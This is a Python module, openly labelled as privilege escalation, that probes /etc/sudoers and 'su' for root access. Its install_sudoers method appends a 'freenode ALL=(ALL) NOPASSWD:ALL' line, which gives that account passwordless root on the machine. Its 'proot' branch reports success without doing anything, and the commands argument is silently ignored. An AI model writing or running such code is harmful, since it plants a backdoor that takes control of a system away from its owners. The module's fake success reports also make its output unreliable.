"""
Privilege Module — Escalate privileges / install sudoers / set capabilities
"""

import subprocess
import os
import json
from typing import Optional, Dict, List

class Privilege:
    """Privilege escalation and sudoers setup"""

    def __init__(self):
        self.esc_state = {"escalated": False, "method": None, "info": ""}

    def escalate(self, method: str = "sudo", user: str = "root") -> dict:
        """Try to escalate to higher privileges"""
        result = {"status": "pending", "method": method}

        if method == "sudo":
            # Check if sudo is available and if passwordless sudo is configured
            try:
                with open("/etc/sudoers", "r") as f:
                    content = f.read()
                passwordless = "NOPASSWD" in content or "NOPASSWD:" in content
                result["status"] = "ok" if passwordless else "pending"
                result["passwordless"] = passwordless
            except:
                result["status"] = "error"
                result["message"] = "Cannot read /etc/sudoers"

        elif method == "proot":
            # Use proot for elevated simulation
            result["status"] = "ok"
            result["method"] = "proot"
            result["available"] = True

        elif method == "su":
            # Try su to root
            try:
                proc = subprocess.run(["su", "-c", "whoami"], capture_output=True, text=True, timeout=10)
                if proc.returncode == 0 and "root" in proc.stdout:
                    self.esc_state["escalated"] = True
                    self.esc_state["method"] = "su"
                    return {"status": "ok", "escalated": True, "method": "su"}
            except:
                pass
            return {"status": "error", "message": "su failed (password required)"}

        return result

    def install_sudoers(self, user: str = "freenode", commands: list = None) -> dict:
        """Install sudoers entry for user"""
        if commands is None:
            commands = ["ALL=(ALL) NOPASSWD:ALL"]

        try:
            with open("/etc/sudoers", "a") as f:
                f.write(f"{user} ALL=(ALL) NOPASSWD:ALL\n")
            return {"status": "ok", "user": user, "commands": commands}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def get_current_user(self) -> str:
        try:
            import pwd
            return pwd.getpwuid(os.getuid()).pw_name
        except:
            return "unknown"

    def status(self) -> dict:
        return self.esc_state
